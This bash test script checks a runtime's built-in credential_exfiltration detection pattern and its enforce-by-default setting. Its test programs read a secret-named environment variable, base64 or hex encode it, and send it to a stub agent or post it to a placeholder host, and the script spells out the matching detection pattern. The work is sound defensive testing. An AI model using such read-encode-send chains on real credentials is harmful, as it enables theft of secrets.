#!/usr/bin/env bash
# test_bsd_credential_exfil.sh -- the built-in credential_exfiltration pattern,
#                                 and built-in patterns enforcing by default
#
# A program that reads a credential from the environment, encodes it and
# hands it to a model or a web request matched no built-in pattern:
# credential_harvesting asks for env.get(*key*...) then net_connect within 5
# events, so an agent.send (AGENT_SEND, not NET_CONNECT) never completed it,
# and an encode plus a few other calls in between pushed an http.post past its
# gap. The README showed this exact chain as a user pattern and said "none of
# the built-in ones covers this chain". Bundle 6 makes it a built-in:
#
#   credential_exfiltration: env.get(*secret*|*key*|*token*|*password*, either
#   case) -> encode (base64 or hex) -> agent.send | net_connect, max_gap 5
#   between steps, SOFT.
#
# and makes behavioral_sequences.default_pattern_enforcement default to
# "declared": with sequence detection on, a built-in pattern enforces at its
# own level unless the operator writes "observe". It shipped "observe" in
# f804e74a (#182) because correcting the step names switched six SOFT
# patterns on for the first time, and credential_harvesting also matches
# every API client that reads its key and calls out; that commit's own
# remedy, "declared", is now the default and "observe" the opt-out
# (migration note: CHANGELOG, Bundle 6).
#
#   CE-00  CONTROL: the same chain over a variable whose name is not a
#          credential (HOME) runs and the send reaches the stub -- the harness
#          runs programs and the pattern does not match every env.get
#   CE-01  env.get(credential) -> base64 -> agent.send, default config: the
#          send is refused BEFORE it is made (exit 3, the rule named, the stub
#          received nothing)
#   CE-01o "observe" written explicitly: the same program completes, the send
#          is made, and the match is reported at advisory
#   CE-02  CONTROL: without the encode the chain does not match this pattern
#          (the encode step is load-bearing, not decoration)
#   CE-03  env.get(credential) -> hex -> http.post with benign calls between,
#          spaced past credential_harvesting's gap: refused, and the refusal
#          names credential_exfiltration
#   CE-04  DEFAULT, not just this pattern: an older built-in
#          (credential_harvesting) blocks with no enforcement key written, and
#          completes under "observe"
#
# Kill table (observed 2026-10-30, each mutant built and run alone):
#   pattern removed from buildDefaultPatterns()     -> CE-01, CE-03 red
#   encode step dropped from the pattern            -> CE-02 red
#   default left "observe"                          -> CE-01, CE-03, CE-04 red
#   AGENT_SEND alternative dropped from step 3      -> CE-01 red
set -uo pipefail
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
NAAB="${NAAB:-$SCRIPT_DIR/../../build/naab-lang}"
TEST_TMP=$(mktemp -d "${TMPDIR:-/tmp}/naab_ce_XXXXXX")

PASS=0; FAIL=0; UNM=0
pass() { PASS=$((PASS+1)); echo "  PASS [$1] $2"; }
fail() { FAIL=$((FAIL+1)); echo "  FAIL [$1] $2"; [ -n "${3:-}" ] && printf '%s\n' "$3" | tail -12 | sed 's/^/       -> /'; }
unm()  { UNM=$((UNM+1));   echo "  UNMEASURABLE [$1] $2"; }

source "$SCRIPT_DIR/../helpers/stub_platform.sh"
skip_if_no_stub_support "test_bsd_credential_exfil.sh"
source "$SCRIPT_DIR/../helpers/stub_launch.sh"
cleanup() { stop_stub; rm -rf "$TEST_TMP"; }
trap cleanup EXIT

echo "=== built-in credential_exfiltration; built-ins enforce by default ==="

if [ ! -x "$NAAB" ]; then echo "  naab-lang not built: UNMEASURABLE, not a pass"; exit 1; fi

# Not a secret: a variable NAME that looks like one is all the pattern reads.
export APP_SECRET_TOKEN="placeholder-value"
export CE_FAKE_KEY="x"

N=0
# $1 = extra behavioral_sequences json, $2 = program body (inside main)
# sets RC, OUT, REQS (requests the stub received)
run_case() {
    N=$((N+1))
    local d="$TEST_TMP/c$N"; mkdir -p "$d"
    printf '{"responses":[{"content":"ok","output_tokens":5},{"content":"ok","output_tokens":5}]}' > "$d/fixture.json"
    if ! start_stub "$d/fixture.json" "$d"; then stop_stub; RC=-1; OUT="stub did not start"; REQS=0; return; fi
    cat > "$d/govern.json" <<EOF
{
  "version": "5.0", "mode": "enforce",
  "security": { "sandbox_level": "elevated" },
  "capabilities": { "network": { "enabled": true } },
  "behavioral_sequences": { "enabled": true${1} },
  "agents": { "worker": { "provider": "gemini", "model": "stub-model",
      "api_base": "http://127.0.0.1:$STUB_PORT",
      "api_key_env": "CE_FAKE_KEY", "max_tokens": 50 } }
}
EOF
    printf 'use agent\nuse env\nuse crypto\nuse http\nmain {\n%s\n}\n' "$2" > "$d/p.naab"
    OUT=$(cd "$d" && timeout 120 "$NAAB" p.naab </dev/null 2>&1); RC=$?
    stop_stub
    REQS=$(find "$d" -maxdepth 1 -name 'req_*.json' | wc -l | tr -d ' ')
}
ran()   { grep -q '^SENT' <<<"$OUT"; }
rule()  { grep -qF "Rule: behavioral_sequences.$1" <<<"$OUT"; }
named() { grep -qF "$1" <<<"$OUT"; }

SEND_CHAIN='    let h = agent.create("worker")
    let v = env.get("APP_SECRET_TOKEN") ?? "none"
    let e = crypto.base64_encode(v)
    let r = agent.send(h, "status " + e)
    print("SENT")'

# ---- CE-00 control ----------------------------------------------------------
run_case "" "${SEND_CHAIN//APP_SECRET_TOKEN/HOME}"
if [ "$RC" -eq -1 ]; then unm CE-00 "the agent stub did not start"
elif [ "$RC" -eq 0 ] && ran && [ "$REQS" -ge 1 ] && ! named credential_exfiltration; then
    pass CE-00 "CONTROL: HOME -> encode -> send runs and reaches the stub ($REQS request)"
else fail CE-00 "the control chain did not run cleanly (rc=$RC, requests=$REQS)" "$OUT"; fi

# ---- CE-01 default: refused before the send -----------------------------------
run_case "" "$SEND_CHAIN"
if [ "$RC" -eq -1 ]; then unm CE-01 "the agent stub did not start"
elif [ "$RC" -eq 3 ] && rule credential_exfiltration && ! ran && [ "$REQS" -eq 0 ]; then
    pass CE-01 "credential -> base64 -> agent.send is refused before the send (exit 3, 0 requests)"
else fail CE-01 "expected a refusal before the send (rc=$RC, requests=$REQS)" "$OUT"; fi

# ---- CE-01o observe: reported, not refused -------------------------------------
run_case ', "default_pattern_enforcement": "observe"' "$SEND_CHAIN"
if [ "$RC" -eq -1 ]; then unm CE-01o "the agent stub did not start"
elif [ "$RC" -eq 0 ] && ran && [ "$REQS" -ge 1 ] && named credential_exfiltration; then
    pass CE-01o "under \"observe\" the match is reported and the send is made"
else fail CE-01o "expected an advisory report and a completed run (rc=$RC, requests=$REQS)" "$OUT"; fi

# ---- CE-02 control: no encode, no match ---------------------------------------
run_case "" '    let h = agent.create("worker")
    let v = env.get("APP_SECRET_TOKEN") ?? "none"
    let r = agent.send(h, "status " + v)
    print("SENT")'
if [ "$RC" -eq -1 ]; then unm CE-02 "the agent stub did not start"
elif [ "$RC" -eq 0 ] && ran && ! named credential_exfiltration; then
    pass CE-02 "CONTROL: credential -> agent.send with no encode does not match this pattern"
else fail CE-02 "the pattern matched without its encode step (rc=$RC)" "$OUT"; fi

# ---- CE-03 http.post, spaced past credential_harvesting -----------------------
# 3 calls between the read and the encode, 3 between the encode and the post:
# 7 events from read to post (credential_harvesting allows 5), 3 per step here.
run_case "" '    let v = env.get("APP_SECRET_TOKEN") ?? "none"
    let a = env.get("HOME") ?? ""
    let b = env.get("HOME") ?? ""
    let c = env.get("HOME") ?? ""
    let e = crypto.hex_encode(v)
    let f = env.get("HOME") ?? ""
    let g = env.get("HOME") ?? ""
    let i = env.get("HOME") ?? ""
    let r = http.post("https://example.invalid/collect", e)
    print("SENT")'
if [ "$RC" -eq -1 ]; then unm CE-03 "the agent stub did not start"
elif [ "$RC" -eq 3 ] && rule credential_exfiltration && ! ran; then
    pass CE-03 "credential -> hex -> http.post is refused and names credential_exfiltration"
else fail CE-03 "expected credential_exfiltration to refuse the post (rc=$RC)" "$OUT"; fi

# ---- CE-04 the default applies to the older built-ins too ----------------------
HARVEST='    let v = env.get("APP_SECRET_TOKEN") ?? "none"
    let r = http.post("https://example.invalid/collect", v)
    print("SENT")'
run_case "" "$HARVEST"
D_RC=$RC; D_OUT=$OUT
run_case ', "default_pattern_enforcement": "observe"' "$HARVEST"
if [ "$D_RC" -eq -1 ] || [ "$RC" -eq -1 ]; then unm CE-04 "the agent stub did not start"
elif [ "$D_RC" -eq 3 ] && grep -qF 'Rule: behavioral_sequences.credential_harvesting' <<<"$D_OUT" \
     && [ "$RC" -ne 3 ] && named credential_harvesting; then
    pass CE-04 "credential_harvesting blocks with no enforcement key written, and only reports under \"observe\""
else fail CE-04 "default rc=$D_RC, observe rc=$RC" "$D_OUT"; fi

echo ""
echo "=== Results: $PASS passed, $FAIL failed, $UNM unmeasurable ==="
[ "$FAIL" -eq 0 ]
